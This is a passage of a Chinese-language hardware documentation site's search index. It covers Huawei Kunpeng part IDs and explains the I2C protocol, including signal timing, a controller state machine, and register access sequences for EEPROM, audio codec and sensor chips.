\u200b\u7ed1\u200b\u6838\u200b\u6027\u80fd\u200b\u5dee\u200b\uff0c\u200b\u53ea\u6709\u200b\u4e0d\u200b\u7ed1\u200b\u6838\u200b\u6027\u80fd\u200b\u7684\u200b 1/20</li> <li>EulerOS V2.0SP11 \u200b\u652f\u6301\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\u7c7b\u578b\u200b</li> </ul>"},{"location":"hardware/huawei.html#kunpeng-920c","title":"Kunpeng 920C","text":"<ul> <li>Server Types Supported by EulerOS V2.0SP12</li> </ul>"},{"location":"hardware/huawei.html#kunpeng-920e","title":"Kunpeng 920E","text":"<ul> <li>Server Types Supported by EulerOS V2.0SP12</li> </ul>"},{"location":"hardware/huawei.html#part-id","title":"part id \u200b\u5217\u8868","text":"<p>implementer 0x48</p> <p>part id:</p> <ul> <li>0xd01: hip08</li> <li>0xd02: Kirin 9000s/hip09</li> <li>0xd03: Kirin 9010/hip10/hip10a/Kirin x90</li> <li>0xd05: Kirin 9020</li> <li>0xd06: hip12</li> <li>0xd22: hip11</li> <li>0xd42: Kirin 9000s/Kirin 9010/Kirin x90</li> <li>0xd43: Kirin x90</li> <li>0xd45: hip10c</li> </ul>"},{"location":"hardware/i2c.html","title":"I2C (Inter-Integrated Circuit)","text":""},{"location":"hardware/i2c.html#_1","title":"\u63a5\u53e3","text":"<p>I2C \u200b\u534f\u8bae\u200b\u6d89\u53ca\u200b\u5230\u200b\u4e24\u4e2a\u200b\u4fe1\u53f7\u200b\uff1a</p> <ul> <li>SCL: \u200b\u65f6\u949f\u200b\u4fe1\u53f7\u200b\uff0cMaster -&gt; Slave</li> <li>SDA\uff1a\u200b\u6570\u636e\u4fe1\u53f7\u200b\uff0cMaster &lt;-&gt; Slave</li> </ul> <p>\u200b\u7531\u4e8e\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u6570\u636e\u4fe1\u53f7\u200b\uff0c\u200b\u6240\u4ee5\u200b SDA \u200b\u7531\u200b Master \u200b\u548c\u200b Slave \u200b\u8f6e\u6d41\u200b\u8f93\u51fa\u200b\u3002\u200b\u4e00\u6b21\u200b\u8bf7\u6c42\u200b\u7684\u200b\u5f00\u59cb\u200b\u6761\u4ef6\u200b\u662f\u200b\uff0cSDA \u200b\u4ece\u200b 1 \u200b\u53d8\u6210\u200b 0\uff0c\u200b\u4e4b\u540e\u200b SCL \u200b\u4ece\u200b 1 \u200b\u53d8\u6210\u200b 0\u3002\u200b\u5f00\u59cb\u200b\u8bf7\u6c42\u200b\u4ee5\u540e\u200b\uff0c\u200b\u6bcf\u6b21\u200b SCL \u200b\u4e0a\u5347\u200b\u6cbf\u200b\u91c7\u6837\u200b\u4e00\u4f4d\u200b\u7684\u200b\u6570\u636e\u200b\u3002\u200b\u8bf7\u6c42\u200b\u7ed3\u675f\u200b\u65f6\u200b\uff0cSCL \u200b\u4ece\u200b 0 \u200b\u53d8\u6210\u200b 1\uff0c\u200b\u7136\u540e\u200b SDA \u200b\u4ece\u200b 0 \u200b\u53d8\u6210\u200b 1\u3002\u200b\u4e00\u6b21\u200b\u8bf7\u6c42\u200b\u7684\u200b\u6ce2\u5f62\u200b\u5982\u4e0b\u200b\uff1a</p> <ol> <li>idle \u200b\u9636\u6bb5\u200b\uff0cscl \u200b\u548c\u200b sda \u200b\u90fd\u200b\u662f\u200b 1</li> <li>start \u200b\u9636\u6bb5\u200b\uff0c\u200b\u9996\u5148\u200b\u662f\u200b sda \u200b\u53d8\u6210\u200b 0\uff0c\u200b\u4e4b\u540e\u200b\u662f\u200b scl \u200b\u53d8\u6210\u200b 0</li> <li>data/ack \u200b\u9636\u6bb5\u200b\uff0c\u200b\u5728\u200b scl \u200b\u4e0a\u5347\u200b\u6cbf\u200b\u91c7\u6837\u200b\u6570\u636e\u200b\uff0c\u200b\u5728\u200b scl \u200b\u4e0b\u964d\u200b\u6cbf\u200b\uff08\u200b\u51c6\u786e\u200b\u6765\u8bf4\u200b\uff0c\u200b\u8d1f\u534a\u200b\u5468\u671f\u200b\uff09\u200b\u4fee\u6539\u200b\u6570\u636e\u200b</li> <li>stop \u200b\u9636\u6bb5\u200b\uff0c\u200b\u9996\u5148\u200b\u662f\u200b scl \u200b\u53d8\u6210\u200b 1\uff0c\u200b\u4e4b\u540e\u200b\u662f\u200b sda \u200b\u53d8\u6210\u200b 1</li> </ol> <p>\u200b\u4f20\u8f93\u6570\u636e\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u4fdd\u8bc1\u200b sda \u200b\u5728\u200b scl \u200b\u6b63\u534a\u200b\u5468\u671f\u200b\u7684\u200b\u65f6\u5019\u200b\u4fdd\u6301\u200b\u4e0d\u53d8\u200b\u3002\u200b\u5982\u679c\u200b\u53d8\u200b\u4e86\u200b\uff0c\u200b\u90a3\u200b\u5c31\u662f\u200b start \u200b\u6216\u8005\u200b stop\u3002\u200b\u56e0\u6b64\u200b\uff0c\u200b\u5728\u200b data/ack \u200b\u9636\u6bb5\u200b\uff0c\u200b\u5efa\u8bae\u200b\u4fdd\u8bc1\u200b sda \u200b\u7684\u200b\u53d8\u5316\u200b\u76f8\u6bd4\u200b scl \u200b\u4e0b\u964d\u200b\u6cbf\u6709\u200b\u4e00\u4e2a\u200b\u5ef6\u8fdf\u200b\uff08Hold Time\uff0c\u200b\u4e00\u822c\u200b\u7684\u200b\u8981\u6c42\u200b\u662f\u200b Min 0us\uff09\u3002\u200b\u5b9e\u73b0\u200b\u65b9\u6cd5\u200b\u53ef\u80fd\u200b\u662f\u200b\u5728\u200b\u5206\u9891\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5148\u62c9\u4f4e\u200b scl\uff0c\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u5468\u671f\u200b\u518d\u200b\u4fee\u6539\u200b sda\u3002</p> <p>\u200b\u8fd9\u91cc\u200b\u7684\u200b data/ack \u200b\u6307\u200b\u7684\u200b\u5219\u200b\u662f\u200b\u4f20\u8f93\u200b\u7684\u200b\u5177\u4f53\u5185\u5bb9\u200b\uff1a\u200b\u4f8b\u5982\u200b master \u200b\u8981\u200b\u4f20\u8f93\u200b 7 \u200b\u4f4d\u200b\u7684\u200b\u5730\u5740\u200b\u548c\u200b 1 \u200b\u4f4d\u200b\u7684\u200b\u8bfb\u200b\u4f7f\u200b\u80fd\u200b\uff0c\u200b\u54cd\u5e94\u200b\u5730\u5740\u200b\u7684\u200b slave \u200b\u8981\u200b\u8fd4\u56de\u200b ack\uff1b\u200b\u4e4b\u540e\u200b\uff0c\u200b\u65e0\u8bba\u662f\u200b master \u200b\u8fd8\u662f\u200b slave \u200b\u53d1\u9001\u6570\u636e\u200b\uff0c\u200b\u63a5\u6536\u200b\u7684\u200b\u4e00\u65b9\u200b\u90fd\u200b\u8981\u200b\u8fd4\u56de\u200b ack\u3002ack \u200b\u662f\u200b\u4f4e\u200b\u6709\u6548\u200b\uff0c\u200b\u610f\u5473\u7740\u200b 0 \u200b\u8868\u793a\u200b\u6210\u529f\u200b\uff08ack\uff09\uff0c1 \u200b\u8868\u793a\u200b\u5931\u8d25\u200b\uff08nack\uff09\u3002</p> <p>\u200b\u7531\u4e8e\u200b sda \u200b\u5e26\u6709\u200b\u4e0a\u62c9\u200b\u7535\u963b\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b slave \u200b\u54cd\u5e94\u200b\uff0cack \u200b\u9636\u6bb5\u200b\u7684\u200b sda \u200b\u5c31\u200b\u4f1a\u200b\u53d8\u6210\u200b 1\uff0c\u200b\u610f\u5473\u7740\u200b\u5931\u8d25\u200b\uff08nack\uff09\u3002</p>"},{"location":"hardware/i2c.html#i2c","title":"I2C \u200b\u63a7\u5236\u5668\u200b\u5b9e\u73b0","text":"<p>\u200b\u7ed3\u5408\u200b\u4e0a\u9762\u200b\u7684\u200b I2C \u200b\u6ce2\u5f62\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8bbe\u8ba1\u200b\u4e00\u4e2a\u200b\u72b6\u6001\u673a\u200b\uff1a</p> <ol> <li>INIT \u200b\u72b6\u6001\u200b\uff1a\u200b\u521d\u59cb\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cSCL \u200b\u548c\u200b SDA \u200b\u90fd\u200b\u4e3a\u200b 1\uff0c\u200b\u8981\u200b\u53d1\u9001\u6570\u636e\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8f6c\u79fb\u200b\u5230\u200b START1 \u200b\u72b6\u6001\u200b</li> <li>START1 \u200b\u72b6\u6001\u200b\uff1a\u200b\u8bbe\u7f6e\u200b SDA=0\uff0c\u200b\u5f53\u200b\u8fbe\u5230\u200b\u5206\u9891\u200b\u6761\u4ef6\u200b\u65f6\u200b\uff0c\u200b\u8f6c\u79fb\u200b\u5230\u200b START2 \u200b\u72b6\u6001\u200b</li> <li>START2 \u200b\u72b6\u6001\u200b\uff1a\u200b\u8bbe\u7f6e\u200b SCL=0\uff0c\u200b\u5f53\u200b\u8fbe\u5230\u200b\u5206\u9891\u200b\u6761\u4ef6\u200b\u65f6\u200b\uff0cSTART \u200b\u53d1\u9001\u200b\u5b8c\u6210\u200b\uff0c\u200b\u8f6c\u79fb\u200b\u5230\u200b SEND \u200b\u72b6\u6001\u200b</li> <li>SEND \u200b\u72b6\u6001\u200b\uff1a\u200b\u5f53\u200b\u8fbe\u5230\u200b\u5206\u9891\u200b\u6761\u4ef6\u200b\u65f6\u200b\uff0cSCL \u200b\u53d6\u53cd\u200b\uff0c\u200b\u5982\u679c\u200b SCL \u200b\u8981\u200b\u4ece\u200b 1 \u200b\u53d8\u6210\u200b 0\uff0c\u200b\u5ef6\u8fdf\u200b\u4e00\u4e2a\u200b\u5468\u671f\u200b\uff0c\u200b\u518d\u200b\u8f93\u51fa\u200b 1 \u200b\u4f4d\u200b\u7684\u200b\u6570\u636e\u200b\u5230\u200b SDA \u200b\u4e0a\u200b\uff0c\u200b\u4fdd\u8bc1\u200b SDA \u200b\u7684\u200b\u53d8\u5316\u200b\u5728\u200b SCL \u200b\u7684\u200b\u8d1f\u534a\u200b\u5468\u671f\u200b\uff1b\u200b\u540c\u65f6\u200b\u7edf\u8ba1\u200b\u4f20\u8f93\u200b\u4f4d\u6570\u200b\uff0c\u200b\u6bcf\u200b\u4f20\u8f93\u200b 8 \u200b\u4f4d\u200b\uff0c\u200b\u5c31\u8981\u200b\u7b49\u5f85\u200b\u4e00\u4e2a\u200b\u5468\u671f\u200b\u8ba9\u200b Slave \u200b\u54cd\u5e94\u200b ACK\uff0c\u200b\u6b64\u65f6\u200b\u8981\u200b\u8bbe\u7f6e\u200b inout \u200b\u8f93\u51fa\u200b\u4e3a\u200b\u9ad8\u200b\u963b\u6001\u200b\uff1b\u200b\u5982\u679c\u200b\u8981\u200b\u8f6c\u6362\u200b\u4f20\u8f93\u200b\u65b9\u5411\u200b\uff0c\u200b\u5373\u200b Master \u200b\u8981\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u90a3\u4e48\u200b\u8f6c\u79fb\u200b\u5230\u200b RECV \u200b\u72b6\u6001\u200b\uff1b\u200b\u5982\u679c\u200b\u4f20\u8f93\u200b\u7ed3\u675f\u200b\uff0c\u200b\u8f6c\u79fb\u200b\u5230\u200b STOP1 \u200b\u72b6\u6001\u200b</li> <li>RECV \u200b\u72b6\u6001\u200b\uff1a\u200b\u5f53\u200b\u8fbe\u5230\u200b\u5206\u9891\u200b\u6761\u4ef6\u200b\u65f6\u200b\uff0cSCL \u200b\u53d6\u53cd\u200b\uff0c\u200b\u5982\u679c\u200b SCL \u200b\u4ece\u200b 0 \u200b\u53d8\u6210\u200b 1\uff0c\u200b\u5bf9\u200b SDA \u200b\u8fdb\u884c\u200b\u91c7\u6837\u200b\u5e76\u4e14\u200b\u4fdd\u5b58\u200b\u4e0b\u6765\u200b\uff1b\u200b\u540c\u65f6\u200b\u7edf\u8ba1\u200b\u4f20\u8f93\u200b\u4f4d\u6570\u200b\uff0c\u200b\u6bcf\u200b\u4f20\u8f93\u200b 8 \u200b\u4f4d\u200b\uff0c\u200b\u5c31\u8981\u200b\u5728\u200b SDA \u200b\u8f93\u51fa\u200b\u4e00\u6b21\u200b ACK\uff1b\u200b\u5982\u679c\u200b\u4f20\u8f93\u200b\u7ed3\u675f\u200b\uff0c\u200b\u8f6c\u79fb\u200b\u5230\u200b STOP1 \u200b\u72b6\u6001\u200b</li> <li>STOP1 \u200b\u72b6\u6001\u200b\uff1a\u200b\u8bbe\u7f6e\u200b SCL=1\uff0c\u200b\u5f53\u200b\u8fbe\u5230\u200b\u5206\u9891\u200b\u6761\u4ef6\u200b\u65f6\u200b\uff0c\u200b\u8f6c\u79fb\u200b\u5230\u200b STOP2 \u200b\u72b6\u6001\u200b</li> <li>STOP2 \u200b\u72b6\u6001\u200b\uff1a\u200b\u8bbe\u7f6e\u200b SDA=1\uff0c\u200b\u5f53\u200b\u8fbe\u5230\u200b\u5206\u9891\u200b\u6761\u4ef6\u200b\u65f6\u200b\uff0c\u200b\u8f6c\u79fb\u200b\u5230\u200b INIT \u200b\u72b6\u6001\u200b</li> </ol> <p>\u200b\u5206\u9891\u200b\u662f\u56e0\u4e3a\u200b\u4e00\u822c\u200b I2C \u200b\u7684\u200b\u9891\u7387\u200b\u6bd4\u8f83\u200b\u4f4e\u200b\uff0c\u200b\u662f\u200b kHz \u200b\u7684\u200b\u91cf\u7ea7\u200b\u3002\u200b\u9700\u8981\u200b\u6309\u7167\u200b\u63a7\u5236\u200b\u903b\u8f91\u200b\u7684\u200b\u4e3b\u9891\u200b\uff0c\u200b\u7ed3\u5408\u200b\u5916\u8bbe\u200b\u80fd\u200b\u63a5\u53d7\u200b\u7684\u200b I2C \u200b\u9891\u7387\u200b\u8303\u56f4\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u5206\u9891\u200b\u7684\u200b\u500d\u6570\u200b\u3002</p>"},{"location":"hardware/i2c.html#_2","title":"\u4e0a\u5c42\u200b\u534f\u8bae","text":"<p>\u200b\u5728\u200b\u6b64\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8bbe\u8ba1\u200b\u4e0a\u5c42\u200b\u534f\u8bae\u200b\uff0c\u200b\u4f8b\u5982\u200b WM8731\uff0c\u200b\u652f\u6301\u200b\u901a\u8fc7\u200b I2C \u200b\u5199\u5165\u200b\u5185\u90e8\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u4e00\u6b21\u200b\u5199\u200b\u64cd\u4f5c\u200b\u5206\u4e3a\u200b\u4ee5\u4e0b\u200b\u6b65\u9aa4\u200b\uff1a</p> <ol> <li>start</li> <li>master \u200b\u53d1\u9001\u200b 7 \u200b\u4f4d\u200b\u7684\u200b\u8bbe\u5907\u200b\u5730\u5740\u200b\u548c\u200b 0\uff08\u200b\u8868\u793a\u200b\u5199\u200b\uff09\uff0cslave \u200b\u53d1\u9001\u200b ack</li> <li>master \u200b\u53d1\u9001\u200b 7 \u200b\u4f4d\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5730\u5740\u200b \u200b\u548c\u200b 1 \u200b\u4f4d\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u6570\u636e\u200b\uff0cslave \u200b\u53d1\u9001\u200b ack</li> <li>master \u200b\u53d1\u9001\u200b 8 \u200b\u4f4d\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u6570\u636e\u200b\uff0cslave \u200b\u53d1\u9001\u200b ack</li> <li>stop</li> </ol> <p>\u200b\u8fd9\u91cc\u200b\u7684\u200b\u7b2c\u4e8c\u6b65\u200b\u53d1\u9001\u200b\u7684\u200b 7 \u200b\u4f4d\u200b\u5730\u5740\u200b + \u200b\u8bfb\u200b/\u200b\u5199\u4f4d\u200b\u662f\u200b\u6807\u51c6\u200b\u7684\u200b\uff0cI2C Slave \u200b\u90fd\u200b\u4f1a\u200b\u6839\u636e\u200b 7 \u200b\u4f4d\u200b\u5730\u5740\u200b\u6765\u200b\u51b3\u5b9a\u200b\u662f\u5426\u200b\u7531\u200b\u81ea\u5df1\u200b\u6765\u200b\u54cd\u5e94\u200b\u3002\u200b\u6b64\u540e\u200b\u7684\u200b\u6570\u636e\u200b\u7684\u200b\u5b9a\u4e49\u200b\uff0c\u200b\u5219\u200b\u662f\u200b\u5404\u4e2a\u200b\u82af\u7247\u200b\u6309\u7167\u200b\u5404\u81ea\u200b\u7684\u200b\u534f\u8bae\u200b\u6765\u200b\u8fdb\u884c\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u8ba9\u200b\u591a\u4e2a\u200b\u540c\u578b\u53f7\u200b I2C \u200b\u82af\u7247\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u4f7f\u7528\u200b\uff0c\u200b\u901a\u5e38\u200b\u82af\u7247\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u5f15\u811a\u200b\u6765\u200b\u914d\u7f6e\u200b\u5b83\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5728\u200b\u8bbe\u8ba1\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7ed9\u200b\u4e0d\u540c\u200b\u7684\u200b\u82af\u7247\u200b\u8bbe\u7f6e\u200b\u4e0d\u540c\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u5c31\u200b\u89e3\u51b3\u200b\u4e86\u200b\u5730\u5740\u200b\u51b2\u7a81\u200b\u7684\u200b\u95ee\u9898\u200b\u3002</p>"},{"location":"hardware/i2c.html#i2c-eeprom","title":"I2C EEPROM","text":"<p>\u200b\u4ee5\u200b AT24C32/AT24C64 \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u5b83\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u4e2a\u200b I2C \u200b\u63a5\u53e3\u200b\u7684\u200b EEPROM\uff0c\u200b\u652f\u6301\u200b\u5982\u4e0b\u200b\u64cd\u4f5c\u200b\uff1a</p> <p>\u200b\u5199\u5165\u200b\u6570\u636e\u200b\uff1astart\uff0c7 \u200b\u4f4d\u200b\u8bbe\u5907\u200b\u5730\u5740\u200b\uff0cW\uff0cACK\uff1b\u200b\u5199\u5165\u200b\u5730\u5740\u200b\u7684\u200b\u9ad8\u200b 8 \u200b\u4f4d\u200b\uff0cack\uff1b\u200b\u5199\u5165\u200b\u5730\u5740\u200b\u7684\u200b\u4f4e\u200b 8 \u200b\u4f4d\u200b\uff0cack\uff1b\u200b\u6570\u636e\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u5b57\u8282\u200b\uff0cack\uff1b\u200b\u6700\u7ec8\u200b stop\u3002</p> <p>\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff1astart\uff0c7 \u200b\u4f4d\u200b\u8bbe\u5907\u200b\u5730\u5740\u200b\uff0cW\uff0cack\uff1b\u200b\u8bfb\u53d6\u200b\u5730\u5740\u200b\u7684\u200b\u9ad8\u200b 8 \u200b\u4f4d\u200b\uff0cack\uff1b\u200b\u8bfb\u53d6\u200b\u5730\u5740\u200b\u7684\u200b\u4f4e\u200b 8 \u200b\u4f4d\u200b\uff0cack\uff1bstart\uff0c7 \u200b\u4f4d\u200b\u8bbe\u5907\u200b\u5730\u5740\u200b\uff0cR\uff0cack\uff1b\u200b\u6570\u636e\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u5b57\u8282\u200b\uff0cack\uff1b\u200b\u6700\u7ec8\u200b\u4e0d\u60f3\u200b\u8bfb\u200b\u7684\u200b\u65f6\u5019\u200b nack\uff0cstop\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u8bbe\u8ba1\u200b\u6210\u5199\u200b\u64cd\u4f5c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ea\u6709\u200b Master \u200b\u5230\u200b Slave \u200b\u7684\u200b\u6570\u636e\u4f20\u8f93\u200b\uff0c\u200b\u53cd\u8fc7\u6765\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ea\u6709\u200b Slave \u200b\u5230\u200b Master \u200b\u7684\u200b\u6570\u636e\u4f20\u8f93\u200b\u3002\u200b\u56e0\u6b64\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u4f20\u8f93\u200b\u8bfb\u53d6\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u8981\u200b\u9996\u5148\u200b\u201c\u200b\u5199\u5165\u200b\u201d\u200b\u8bfb\u53d6\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u518d\u200b\u8fdb\u884c\u200b\u4e00\u6b21\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u628a\u200b\u6570\u636e\u200b\u8bfb\u51fa\u6765\u200b\u3002</p>"},{"location":"hardware/i2c.html#i2c-audio-codec","title":"I2C Audio Codec","text":"<p>\u200b\u4e0a\u9762\u200b\u7684\u200b\u4f8b\u5b50\u200b\u4e2d\u200b\u7684\u200b WM8731 \u200b\u5b9e\u9645\u4e0a\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b Audio Codec\uff0c\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b I2C \u200b\u5bf9\u200b\u5176\u200b\u5bc4\u5b58\u5668\u200b\u8fdb\u884c\u200b\u5199\u5165\u200b\u3002WM8731 \u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5730\u5740\u200b\u6709\u200b 9 \u200b\u4f4d\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\u6709\u200b 8 \u200b\u4f4d\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5199\u5165\u200b\u6d41\u7a0b\u200b\u662f\u200b\uff1astart\uff0c7 \u200b\u4f4d\u200b\u8bbe\u5907\u200b\u5730\u5740\u200b\uff0cW\uff0cack\uff1b7 \u200b\u4f4d\u200b\u5bc4\u5b58\u5668\u200b\u5730\u5740\u200b\uff0c1 \u200b\u4f4d\u200b\u5bc4\u5b58\u5668\u200b\u6570\u636e\u200b\uff0cack\uff1b8 \u200b\u4f4d\u200b\u5bc4\u5b58\u5668\u200b\u6570\u636e\u200b\uff0cack\uff1bstop\u3002</p>"},{"location":"hardware/i2c.html#i2c-sensor","title":"I2C Sensor","text":"<p>\u200b\u4e3e\u200b\u4e00\u4e2a\u200b\u4f20\u611f\u5668\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff1aPAJ7620U2: Integrated Gesture Recognition Sensor \uff0c\u200b\u5b83\u200b\u4e5f\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\u8bfb\u5199\u200b\u7684\u200b\u63a5\u53e3\u200b\uff0c\u200b\u652f\u6301\u200b\u5982\u4e0b\u200b\u64cd\u4f5c\u200b\uff1a</p> <p>\u200b\u5355\u6b21\u200b\u5199\u5165\u200b\uff1astart\uff0c7 \u200b\u4f4d\u200b\u8bbe\u5907\u200b\u5730\u5740\u200b\uff0cW\uff0cack\uff1b8 \u200b\u4f4d\u200b\u5730\u5740\u200b\uff0cack\uff1b8 \u200b\u4f4d\u200b\u6570\u636e\u200b\uff0cack\uff1bstop\u3002</p> <p>\u200b\u5355\u6b21\u200b\u8bfb\u53d6\u200b\uff1astart\uff0c7 \u200b\u4f4d\u200b\u8bbe\u5907\u200b\u5730\u5740\u200b\uff0cW\uff0cack\uff1b8 \u200b\u4f4d\u200b\u5730\u5740\u200b\uff0cack\uff1bstop\uff1bstart\uff0c7 \u200b\u4f4d\u200b\u8bbe\u5907\u200b\u5730\u5740\u200b\uff0cR\uff0cack\uff1b8 \u200b\u4f4d\u200b\u6570\u636e\u200b\uff0cnack\uff1bstop\u3002\u200b\u8fd9\u91cc\u200b\u7684\u200b\u8bfb\u53d6\u200b\u4e5f\u200b\u62c6\u6210\u200b\u4e86\u200b\u4e24\u6b65\u200b\uff1a\u200b\u7b2c\u4e00\u6b65\u200b\u201c\u200b\u5199\u5165\u200b\u201d\u200b\u8bfb\u53d6\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u7b2c\u4e8c\u6b65\u200b\u8bfb\u200b\u53d6\u51fa\u200b\u6570\u636e\u200b\u3002\u200b\u6700\u540e\u200b\u7684\u200b nack \u200b\u8868\u793a\u200b master \u200b\u4e0d\u200b\u9700\u8981\u200b\u8bfb\u53d6\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u8981\u200b\u6279\u91cf\u200b\u8bfb\u53d6\u200b\u7684\u8bdd\u200b\uff0c\u200b\u53ea\u8981\u200b\u5728\u200b\u5355\u6b21\u200b\u8bfb\u53d6\u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u8bfb\u53d6\u6570\u636e\u200b\u7684\u200b\u65f6\u5019\u200b\u53d1\u200b ack\uff0c\u200b\u7b49\u5230\u200b\u4e0d\u200b\u9700\u8981\u200b\u7ee7\u7eed\u200b\u8bfb\u200b\u7684\u200b\u65f6\u5019\u200b\u518d\u53d1\u200b nack\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8fde\u7eed\u200b\u8bfb\u53d6\u200b\u591a\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u8fd9\u4e9b\u200b\u547d\u4ee4\u200b\u683c\u5f0f\u200b\u548c\u200b\u4e0a\u9762\u200b\u7684\u200b I2C EEPROM \u200b\u57fa\u672c\u200b\u662f\u200b\u4e00\u6837\u200b\u7684\u200b\u3002</p> <p>\u200b\u989c\u8272\u200b\u4f20\u611f\u5668\u200b TCS3472 \u200b\u7684\u200b\u547d\u4ee4\u200b\u683c\u5f0f\u200b\u4e5f\u200b\u662f\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u3002</p>"},{"location":"hardware/i2c.html#dual-slave-address","title":"Dual Slave Address","text":"<p>I2C \u200b\u7684\u200b\u6bcf\u4e2a\u200b slave \u200b\u90fd\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5730\u5740\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4e0d\u540c\u200b slave \u200b\u7684\u200b\u5730\u5740\u200b\u5e94\u8be5\u200b\u4e5f\u200b\u662f\u200b\u4e0d\u540c\u200b\u7684\u200b\u3002\u200b\u4f46\u200b\u5047\u5982\u200b\u8981\u200b\u7528\u200b\u591a\u4e2a\u200b\u540c\u578b\u53f7\u200b\u7684\u200b\u82af\u7247\u200b\uff0c\u200b\u600e\u4e48\u529e\u200b\uff1f\u200b\u6240\u4ee5\u200b\u5f88\u591a\u200b\u82af\u7247\u200b\u7684\u200b slave \u200b\u5730\u5740\u200b\u662f\u200b\u53ef\u4ee5\u200b\u6539\u200b\u7684\u200b\uff0c\u200b\u901a\u8fc7\u200b\u4e00\u4e9b\u200b\u5f15\u811a\u200b\u7684\u200b\u62c9\u9ad8\u200b\u6216\u62c9\u4f4e\u200b\u6765\u200b\u914d\u7f6e\u200b\u3002</p> <p>\u200b\u4f46\u200b\u4e5f\u200b\u6709\u200b\u4e00\u4e9b\u200b\u82af\u7247\u200b\uff08\u200b\u5982\u200bVCNL36828P\uff09\u200b\u7528\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u7279\u522b\u200b\u7684\u200b\u65b9\u6cd5\u200b\u6765\u200b\u914d\u7f6e\u200b\u4e0d\u540c\u200b\u7684\u200b slave \u200b\u5730\u5740\u200b\uff1a\u200b\u6b63\u63a5\u200b\u548c\u200b\u53cd\u63a5\u200b\u3002\u200b\u6b63\u63a5\u200b\u5c31\u662f\u200b master \u200b\u7684\u200b SCL \u200b\u63a5\u200b slave \u200b\u7684\u200b SCL\uff0cmaster \u200b\u7684\u200b SDA \u200b\u63a5\u200b slave \u200b\u7684\u200b SDA\uff1b\u200b\u53cd\u63a5\u200b\u5c31\u662f\u200b master \u200b\u7684\u200b SCL \u200b\u63a5\u200b slave \u200b\u7684\u200b SDA\uff0cmaster \u200b\u7684\u200b SDA \u200b\u63a5\u200b slave \u200b\u7684\u200b SCL\u3002\u200b\u6b63\u63a5\u200b\u548c\u200b\u53cd\u63a5\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u6b63\u5e38\u200b\u5de5\u4f5c\u200b\uff0c\u200b\u7528\u200b\u7684\u200b\u662f\u200b\u4e0d\u540c\u200b\u7684\u200b slave \u200b\u5730\u5740\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8fd9\u4e2a\u200b\u64cd\u4f5c\u200b\u5bf9\u200b master \u200b\u6765\u8bf4\u200b\u662f\u200b\u900f\u660e\u200b\u7684\u200b\uff0c\u200b\u5176\u4ed6\u200b slave \u200b\u4f9d\u7136\u200b\u662f\u200b\u6b63\u63a5\u200b\u3002\u200b\u80cc\u540e\u200b\u7684\u200b\u5b9e\u73b0\u200b\u539f\u7406\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u731c\u200b\u5230\u200b\uff1aslave \u200b\u4fa7\u200b\u68c0\u6d4b\u200b SCL \u200b\u548c\u200b SDA 